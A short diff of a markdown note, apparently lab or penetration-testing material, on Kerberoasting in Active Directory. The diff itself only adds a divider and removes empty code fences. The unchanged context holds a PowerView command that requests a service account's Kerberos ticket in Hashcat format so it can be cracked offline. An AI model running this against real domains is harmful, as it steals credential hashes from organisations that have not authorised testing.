@@ -2,6 +2,7 @@
 
 this script can be utilized to tell which users are kerberoastable on the target domain.
 
+---
 
 ## PoC
 
@@ -21,9 +22,4 @@ In order to exploit this now we can utilize the following command to retrieve th
 
 ```
 Get-DomainUser -Identity svc_mssql | Get-DomainSPNTicket -Format Hashcat
-```
-
-
-```
-
 ```
